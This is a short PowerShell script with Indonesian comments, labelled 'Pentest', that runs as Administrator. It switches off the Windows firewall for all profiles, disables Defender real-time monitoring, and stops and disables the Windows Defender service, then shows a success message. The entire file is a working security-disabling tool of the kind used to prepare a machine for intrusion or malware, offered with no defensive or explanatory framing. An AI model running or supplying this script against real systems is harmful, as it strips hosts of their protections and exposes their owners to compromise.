# Harus dijalankan sebagai Administrator

# Matikan Firewall dulu
netsh advfirewall set allprofiles state off

# Nonaktifkan Realtime Protection (jika Defender aktif)
try {
    Set-MpPreference -DisableRealtimeMonitoring $true
} catch {
    Write-Output "Set-MpPreference gagal: $_"
}

# Stop dan disable service Windows Defender
sc.exe stop WinDefend
sc.exe config WinDefend start= disabled

# Notifikasi berhasil
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("✅ Script berhasil dijalankan!", "Pentest", 'OK', 'Information')
